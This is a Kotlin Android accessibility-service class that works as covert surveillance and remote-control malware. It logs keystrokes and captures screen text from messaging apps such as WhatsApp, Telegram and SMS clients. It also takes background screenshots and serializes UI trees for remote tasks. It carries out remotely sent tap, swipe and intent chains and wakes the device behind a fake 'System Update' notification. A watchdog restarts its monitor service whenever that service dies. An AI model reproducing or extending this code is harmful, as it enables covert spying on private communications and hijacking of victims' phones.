package com.example.myandroid

import kotlinx.coroutines.*

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
    }

    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
    
    // THROTTLE CONTROL
    private var lastScreenRead: Long = 0
    private val READ_DELAY = 1000L // Only read screen once per second

    // TREE SCRAPER STATE
    private data class TreeTask(
        val id: Int,
        val pkg: String?,
        val durationMs: Long,
        var endTime: Long = 0L,
        val depth: Int = 10,
        var lastSnapshot: JSONObject? = null,
        var job: Job? = null
    )
    private val treeTasks = mutableListOf<TreeTask>()
    
    // PHOENIX STATE
    private var lastPhoenixCheck = 0L



    private fun checkMainServiceHealth() {
        try {
            if (!MonitorService.isRunning) {
                DebugLogger.log("PHOENIX", "Accessibility Symbiote detected dead MonitorService. Resurrecting...")
                val i = Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(i)
                else startService(i)
                
                // Also re-ignite the alarm manager loop
                KeepAliveReceiver.scheduleNext(this)
            }
        } catch (e: Exception) {}
    }

        fun resetAllTasks() {
        treeTasks.forEach { it.job?.cancel() }
        treeTasks.clear()
        saveTreeTasks()
        DebugLogger.log("SCRAM", "Hard Reset: All Scraper Tasks Aborted and Purged")
    }

    fun startTreeDump(pkg: String?, mins: Long, cmdId: Int = -1, depth: Int = 10) {
        if (mins <= 0L) {
            resetAllTasks()
            return
        }

        val target = if (pkg.isNullOrEmpty() || pkg == "null") null else pkg
        val durMs = mins * 60 * 1000
        
        val newTask = TreeTask(id = cmdId, pkg = target, durationMs = durMs, depth = depth)
        treeTasks.add(newTask)
        saveTreeTasks()
        
        DebugLogger.log("SCRAM", "Task Queued: [${target ?: "GLOBAL"}] (ID: $cmdId). Total Tasks: ${treeTasks.size}")
        
        if (target == null) {
            initiateTaskSession(newTask)
        }
    }

    private fun initiateTaskSession(task: TreeTask) {
        if (task.endTime != 0L) return // Already running
        
        task.endTime = System.currentTimeMillis() + task.durationMs
        saveTreeTasks()
        
        DebugLogger.log("SCRAM", "Session started for ID: ${task.id}. Resolving in ${task.durationMs / 1000}s.")
        
        task.job = CoroutineScope(Dispatchers.IO).launch {
            val delayMs = task.endTime - System.currentTimeMillis()
            if (delayMs > 0) delay(delayMs)
            
            // Resolve Task
            val result = JSONObject().apply {
                put("depth_limit", task.depth)
                if (task.lastSnapshot != null) put("snapshot", task.lastSnapshot)
                else put("error", "NO_DATA_CAPTURED_IN_SESSION")
            }
            
            CommandProcessor.updateCommandStatus(applicationContext, task.id, "SCAN_COMPLETE", null, result, null)
            DebugLogger.log("SCRAM", "Session expired. Task [${task.id}] resolved and removed.")
            
            treeTasks.remove(task)
            saveTreeTasks()
        }
    }

    private fun saveTreeTasks() {
        val arr = JSONArray()
        treeTasks.forEach { t ->
            val o = JSONObject()
            o.put("id", t.id); o.put("pkg", t.pkg); o.put("dur", t.durationMs)
            o.put("end", t.endTime); o.put("depth", t.depth)
            arr.put(o)
        }
        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
            .putString("tree_tasks_json", arr.toString()).apply()
    }

    private fun loadTreeTasks() {
        try {
            val raw = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("tree_tasks_json", "[]")
            val arr = JSONArray(raw)
            treeTasks.clear()
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val task = TreeTask(
                    id = o.getInt("id"),
                    pkg = if (o.isNull("pkg")) null else o.getString("pkg"),
                    durationMs = o.getLong("dur"),
                    endTime = o.getLong("end"),
                    depth = o.getInt("depth")
                )
                treeTasks.add(task)
                
                // Resume watchdog if it was already running
                if (task.endTime > System.currentTimeMillis()) {
                    initiateTaskSession(task)
                } else if (task.endTime > 0) {
                    // Expired while dead - will be cleaned up on next logic cycle
                }
            }
        } catch (e: Exception) { }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this



        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // Restore Scraper Session Queue
        loadTreeTasks()
        
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: return
        
        // --- 0. PHOENIX HOOK (Resurrection check) ---
        val now = System.currentTimeMillis()
        if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
            lastPhoenixCheck = now
            checkMainServiceHealth()
        }

        // --- 1. GHOST HAND LOGIC ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- 1.5 TREE SCRAPER ENGINE (Multi-Task Queue) ---
        val tasksToProcess = treeTasks.filter { it.pkg == null || it.pkg == pkgName }
        
        if (tasksToProcess.isNotEmpty()) {
            val root = rootInActiveWindow
            tasksToProcess.forEach { task ->
                // 1. Target Acquisition Logic
                if (task.endTime == 0L) {
                    initiateTaskSession(task)
                    CoroutineScope(Dispatchers.IO).launch {
                        CommandProcessor.updateCommandStatus(applicationContext, task.id, "TARGET_ACQUIRED_RECORDING", null, null, null)
                    }
                }
                
                // 2. Data Capture Logic
                if (root != null && now < task.endTime && (now - lastScreenRead > 2000)) {
                    val treeJson = serializeNode(root, 0, task.depth)
                    task.lastSnapshot = treeJson
                    
                    // Shared Stream Logging (Optional but helpful)
                    val wrapper = JSONObject()
                    wrapper.put("pkg", pkgName)
                    wrapper.put("ts", now)
                    wrapper.put("tree", treeJson)
                    DumpManager.appendLog("TREE", wrapper)
                }
            }
            if (now - lastScreenRead > 2000) lastScreenRead = now
        }

        // Periodically purge expired tasks that missed the watchdog
        val expired = treeTasks.filter { it.endTime in 1..now }
        if (expired.isNotEmpty()) {
            expired.forEach { 
                DebugLogger.log("SCRAM", "Task ${it.id} cleaned up manually.")
                treeTasks.remove(it) 
            }
            saveTreeTasks()
        }

        // --- 2. STANDARD MONITORING ---
        if (now < nextAllowedCheck) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             // Logic delegated to TypingManager
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
        
        // Feature Gate: Screen Reader
        if (!ConfigManager.canCollect(this, "screen_reader")) return

        // THROTTLE: Prevent high CPU usage during scrolling
        if (now - lastScreenRead < READ_DELAY) return
        lastScreenRead = now

        val source = event.source ?: return
        val textContent = StringBuilder()
        extractText(source, textContent)
        
        if (textContent.isNotEmpty()) {
            val pm = packageManager
            val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
            val newTxt = textContent.take(100).toString()
            
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val historyStr = prefs.getString("text_history_by_app", "{}")
                val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
                val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

                val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
                
                if (newTxt != lastTxt) {
                    nextAllowedCheck = System.currentTimeMillis() + 500
                    
                    // 1. STREAM LOGGING (NO LAG)
                    val entry = JSONObject()
                    entry.put("pkg", appName)
                    entry.put("ts", System.currentTimeMillis())
                    entry.put("txt", newTxt)
                    DumpManager.appendLog("SCREEN", entry)
                    
                    // 2. Update Stats (Using commit() to bypass QueuedWork ANR)
                    prefs.edit()
                        .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                        .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                        .commit()

                    // 3. Verify
                    DumpManager.logVerification("READER", pkgName)
                } else {
                    nextAllowedCheck = System.currentTimeMillis() + 3000
                }
            }
        }
    }

    fun engageGhostHand() {
        // Logic disabled: UI interaction is too fragile and manufacturer-dependent
        DebugLogger.log("GHOST", "Ghost Hand engagement skipped (Disabled)")
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        // No-op: Ghost logic disabled
    }

    private fun performSwipeDown() {
        // No-op: Ghost logic disabled
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        // No-op: Ghost logic disabled
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) sb.append(node.text).append(" ")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    fun serializeNode(node: AccessibilityNodeInfo?, depth: Int, maxDepth: Int): JSONObject? {
        if (node == null || depth > maxDepth) return null
        val json = JSONObject()
        try {
            json.put("class", node.className?.toString() ?: "")
            json.put("text", node.text?.toString() ?: "")
            json.put("desc", node.contentDescription?.toString() ?: "")
            json.put("id", node.viewIdResourceName ?: "")
            json.put("clickable", node.isClickable)
            
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            json.put("bounds", "${bounds.left},${bounds.top},${bounds.right},${bounds.bottom}")

            if (node.childCount > 0 && depth < maxDepth) {
                val children = JSONArray()
                for (i in 0 until node.childCount) {
                    val child = serializeNode(node.getChild(i), depth + 1, maxDepth)
                    if (child != null) children.put(child)
                }
                json.put("children", children)
            }
        } catch (e: Exception) {}
        return json
    }

    fun getInstantTree(targetPkg: String?, maxDepth: Int): JSONObject {
        val result = JSONObject()
        try {
            val root = rootInActiveWindow ?: return result.put("error", "NO_ACTIVE_WINDOW")
            val currentPkg = root.packageName?.toString() ?: ""
            
            if (targetPkg != null && targetPkg != "null" && targetPkg != currentPkg) {
                return result.put("error", "TARGET_NOT_IN_FOREGROUND").put("found", currentPkg)
            }

            result.put("package", currentPkg)
            result.put("timestamp", System.currentTimeMillis())
            result.put("tree", serializeNode(root, 0, maxDepth))
        } catch (e: Exception) { result.put("error", e.message) }
        return result
    }

    override fun onInterrupt() {}

    // --- REMOTE INTERACTION ENGINE (CHAIN CAPABLE) ---
    suspend fun executeInteractionChain(chain: JSONArray): String {
        DebugLogger.log("CHAIN_START", "Received chain with ${chain.length()} steps: $chain")
        val report = StringBuilder()
        for (i in 0 until chain.length()) {
            val step = chain.getJSONObject(i)
            val type = step.optString("type").uppercase()
            val value = step.optString("val")
            val stepDelay = step.optLong("delay", 100L)
            
            DebugLogger.log("CHAIN_STEP", "Executing Step $i: TYPE=$type, VAL=$value, DELAY=$stepDelay")
            delay(stepDelay) // Short mandatory delay between steps for OS processing

            val success = try {
                when (type) {
                    "WAIT" -> { 
                        val waitTime = value.toLongOrNull() ?: 500L
                        DebugLogger.log("CHAIN_WAIT", "Sleeping for ${waitTime}ms")
                        delay(waitTime)
                        true 
                    }
                    "WAKE" -> {
                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:ChainWake")
                        wakeLock.acquire(3000)

                        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                        val channelId = "system_integrity_alerts"
                        
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            val channel = android.app.NotificationChannel(channelId, "System Integrity", android.app.NotificationManager.IMPORTANCE_HIGH)
                            channel.setSound(null, null)
                            channel.enableVibration(false)
                            nm.createNotificationChannel(channel)
                        }

                        val intent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION or android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            putExtra("is_wake_trigger", true)
                            if (value.contains("wellbeing", ignoreCase = true)) putExtra("route_to_settings", true)
                        }

                        val pendingIntent = android.app.PendingIntent.getActivity(
                            applicationContext, 99, intent, 
                            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                        )

                        val builder = androidx.core.app.NotificationCompat.Builder(applicationContext, channelId)
                            .setSmallIcon(android.R.drawable.ic_menu_info_details)
                            .setContentTitle("System Update")
                            .setContentText("Synchronizing system health parameters...")
                            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                            .setFullScreenIntent(pendingIntent, true)
                            .setAutoCancel(true)
                            .setTimeoutAfter(3000)

                        nm.notify(99, builder.build())
                        DebugLogger.log("CHAIN_WAKE", "Strong FSI Wake lock dispatched")
                        true
                    }
                    "NAV" -> {
                        val actionCode = when(value.uppercase()) {
                            "BACK" -> GLOBAL_ACTION_BACK
                            "HOME" -> GLOBAL_ACTION_HOME
                            "RECENTS" -> GLOBAL_ACTION_RECENTS
                            "NOTIFS" -> GLOBAL_ACTION_NOTIFICATIONS
                            else -> 0
                        }
                        if (actionCode == 0) {
                            DebugLogger.log("CHAIN_NAV_ERR", "Unknown nav action: $value")
                            false
                        } else {
                            val res = performGlobalAction(actionCode)
                            DebugLogger.log("CHAIN_NAV", "Nav $value executed: $res")
                            res
                        }
                    }
                    "TAP" -> {
                        val coords = value.split("|", ",")
                        if (coords.size >= 2) {
                            dispatchClick(coords[0].toFloat(), coords[1].toFloat())
                        } else {
                            DebugLogger.log("CHAIN_TAP_ERR", "Invalid coordinates: $value")
                            false
                        }
                    }
                    "NODE" -> {
                        val root = rootInActiveWindow
                        val nodes = root?.findAccessibilityNodeInfosByViewId(value)
                        val node = nodes?.firstOrNull() ?: root?.findAccessibilityNodeInfosByText(value)?.firstOrNull()
                        if (node != null) {
                            val bounds = android.graphics.Rect()
                            node.getBoundsInScreen(bounds)
                            DebugLogger.log("CHAIN_NODE", "Found node '$value' at ${bounds.exactCenterX()}, ${bounds.exactCenterY()}")
                            dispatchClick(bounds.centerX().toFloat(), bounds.centerY().toFloat())
                        } else {
                            DebugLogger.log("CHAIN_NODE_ERR", "Node '$value' not found in active window")
                            false
                        }
                    }
                    "SWIPE" -> {
                        val p = value.split("|", ",")
                        if (p.size >= 4) {
                            dispatchGesturePath(listOf(Pair(p[0].toFloat(), p[1].toFloat()), Pair(p[2].toFloat(), p[3].toFloat())), p.getOrNull(4)?.toLongOrNull() ?: 300L)
                        } else {
                            DebugLogger.log("CHAIN_SWIPE_ERR", "Invalid swipe coords: $value")
                            false
                        }
                    }
                    "PATH" -> {
                        val p = value.split("|", ",")
                        if (p.size >= 4) {
                            val points = mutableListOf<Pair<Float, Float>>()
                            val hasDuration = p.size % 2 != 0
                            val limit = if (hasDuration) p.size - 1 else p.size
                            for (j in 0 until limit step 2) {
                                points.add(Pair(p[j].toFloat(), p[j+1].toFloat()))
                            }
                            val duration = if (hasDuration) p.last().toLongOrNull() ?: 1000L else 1000L
                            dispatchGesturePath(points, duration)
                        } else {
                            DebugLogger.log("CHAIN_PATH_ERR", "Invalid path coords. Need pairs of X,Y: $value")
                            false
                        }
                    }
                    "INTENT" -> {
                        try {
                            val json = JSONObject(value)
                            val intent = android.content.Intent(json.optString("action", android.content.Intent.ACTION_VIEW))
                            val dataStr = json.optString("data", "")
                            if (dataStr.isNotEmpty()) {
                                val safeData = if (dataStr.startsWith("tel:", ignoreCase = true)) dataStr.replace("#", "%23") else dataStr
                                intent.data = android.net.Uri.parse(safeData)
                            }
                            if (json.has("pkg")) intent.setPackage(json.getString("pkg"))
                            val typeStr = json.optString("type", "")
                            if (typeStr.isNotEmpty()) {
                                if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                                else intent.type = typeStr
                            }
                            val extras = json.optJSONObject("extras")
                            extras?.keys()?.forEach { key ->
                                val v = extras.get(key)
                                if (v is Boolean) intent.putExtra(key, v)
                                else if (v is Int) intent.putExtra(key, v)
                                else intent.putExtra(key, v.toString())
                            }
                            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            val target = json.optString("target", "activity").lowercase()
                            when (target) {
                                "service" -> { if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent) }
                                "broadcast" -> sendBroadcast(intent)
                                else -> startActivity(intent)
                            }
                            true
                        } catch (e: Exception) {
                            DebugLogger.log("CHAIN_INTENT_ERR", e.toString())
                            false
                        }
                    }
                    else -> {
                        DebugLogger.log("CHAIN_ERR", "Unknown step type: $type")
                        false
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log("CHAIN_EXC", "Exception in step $i: ${e.message}")
                false
            }
            
            DebugLogger.log("CHAIN_RESULT", "Step $i result: ${if(success) "SUCCESS" else "FAILED"}")
            report.append("Step $i ($type): ${if(success) "OK" else "FAIL"}; ")
        }
        DebugLogger.log("CHAIN_END", "Chain execution finished. Report: $report")
        return report.toString()
    }

        private suspend fun dispatchClick(x: Float, y: Float): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        
        DebugLogger.log("GHOST_DEBUG", "Attempting Tap at [$x, $y] | Screen: ${pm.isInteractive} | Locked: ${km.isKeyguardLocked}")

        val path = android.graphics.Path()
        path.moveTo(x, y)
        // BUGFIX: Move 1 pixel down and to the right to prevent native Gesture Recognizer math from hanging on perfectly overlapping lines
        path.lineTo(x + 1f, y + 1f)

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50)) // 50ms is clean and fast for a standard tap
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture confirmed by OS at $x,$y")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture REJECTED by OS. Check if screen is locked or overlapping system UI.")
                    deferred.complete(false)
                }
            }, null) // Passing null forces it automatically onto the main service thread
            
            if (!dispatched) {
                DebugLogger.log("GHOST_ERR", "dispatchGesture returned false immediately.")
                deferred.complete(false)
            }
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", "Gesture Dispatch Failed: ${e.message}")
            deferred.complete(false)
        }
        
        // Wait for OS callback, but safeguard against infinite hang if OS drops the event
        val result = withTimeoutOrNull(2000) { deferred.await() }
        if (result == null) {
            DebugLogger.log("GHOST_TIMEOUT", "OS dropped the gesture event silently (Timeout after 2000ms)")
            return false
        }
        return result
    }

    private suspend fun dispatchGesturePath(points: List<Pair<Float, Float>>, dur: Long): Boolean {
        val path = android.graphics.Path()
        val start = points.first()
        path.moveTo(start.first, start.second)
        
        points.drop(1).forEach { (x, y) ->
            path.lineTo(x, y)
        }

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, dur))
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture Path Completed")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture Cancelled by System")
                    deferred.complete(false)
                }
            }, Handler(Looper.getMainLooper()))
            
            if (!dispatched) deferred.complete(false)
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", e.message ?: "Unknown")
            deferred.complete(false)
        }
        
        return withTimeoutOrNull(dur + 2000) { deferred.await() } ?: false
    }

    fun captureScreenshot(quality: Int, callback: (java.io.File?) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            DebugLogger.log("SCREENSHOT_ERR", "API 30+ required for background screenshot.")
            callback(null)
            return
        }

        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, applicationContext.mainExecutor, object : AccessibilityService.TakeScreenshotCallback {
            override fun onSuccess(screenshot: ScreenshotResult) {
                try {
                    val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap == null) { callback(null); return }
                    
                    val file = java.io.File(cacheDir, "scrn_${System.currentTimeMillis()}.jpg")
                    java.io.FileOutputStream(file).use { out ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, out)
                    }
                    screenshot.hardwareBuffer.close()
                    callback(file)
                } catch (e: Exception) {
                    DebugLogger.log("SCREENSHOT_ERR", "Processing failed: ${e.message}")
                    callback(null)
                }
            }
            override fun onFailure(errorCode: Int) {
                DebugLogger.log("SCREENSHOT_ERR", "System denied capture. Error code: $errorCode")
                callback(null)
            }
        })
    }

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }
}
